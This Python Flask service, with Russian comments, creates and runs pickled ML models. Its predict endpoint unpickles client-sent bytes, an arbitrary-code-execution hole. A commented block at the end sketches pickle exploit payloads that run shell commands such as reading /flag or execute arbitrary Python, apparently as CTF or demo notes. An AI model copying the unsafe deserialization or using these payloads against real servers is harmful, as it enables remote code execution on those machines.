#!flask/bin/python 
from flask import Flask, jsonify, request
import pickle
import classification as cl

app = Flask(__name__)

# в брокер
@app.route('/algorithms', methods=['GET'])
def get_algorithms():
  return cl.get_algorithms()

# в брокер
#TODO: согласовать все названия ключей, топик и т.д.
# @app.route('/model/train', methods=['POST'])
# def train_model():
#   # {"model": model, "train_X": X, "train_y": y, "test", "id": id}
#   model, X, y = request.json[0], request.json[1], request.json[2]
#   model = pickle.loads(bytes(model))
#   model, feature_importances = cl.train(model, X, y)
#   # {"model": }
#   return jsonify([list(pickle.dumps(model)), scores, feature_importances, id])

#TODO: возвращать под каждый алгоритм список гиперпараметров, если это Enum то вернуть все возможные значения, + тип
#TODO: гиперпараметры в algorithms
@app.route('/model/create', methods=['POST'])
def create_model():
  model_name, params = request.json[0], request.json[1]
  model, hyperparams = cl.create(model_name, params)
  return jsonify([list(pickle.dumps(model)), hyperparams])

@app.route('/model/predict', methods=['POST'])
def model_predict():
  model, X = request.json[0], request.json[1]
  model = pickle.loads(bytes(model))
  return jsonify(cl.predict(model, X))

if __name__ == '__main__':
  app.run(debug=True)

#TODO: GET /algorithms
#      Без параметров
#      Вернуть массив поддерживаемых алгоритмов
#TODO: POST /model/create
#      Алгоритм из списка, гиперпараметры
#      Вернуть состояние модели и её гиперпараметры
#TODO: POST /model/train
#      Состояние модели, матрица атрибутов, массив меток
#      Вернуть состояние модели, ранжированный список (как feature_importances из RF) (если есть)
#TODO: POST /model/predict
#      Состояние модели, матрица атрибутов
#      Вернуть массив меток и вероятности (если есть)

'''
# Pickle vulnerability  
# Linux
# import subprocess
# class Payload(object):
#   """ Executes /bin/ls when unpickled. """
#   def __reduce__(self):
#       """ Run /bin/ls on the remote machine. """
#       return (subprocess.Popen, (('ls', ),))
# return jsonify([list(pickle.dumps(Payload())), hyperparams])

# class Payload(object):
#   """ Executes /bin/ls when unpickled. """
#   def __reduce__(self):
#       """ Run /bin/ls on the remote machine. """
#       return (subprocess.check_output, (['cat', '/flag'],))

# Python code
# def construct_vulnerable_pickle(python_code):
#   assembly_code = f'c__builtin__\nexec\n(V{python_code}\ntR.' 
#   return bytes(assembly_code, 'utf8')
# return jsonify([list(construct_vulnerable_pickle("print('running arbitrary code!')")), hyperparams])
'''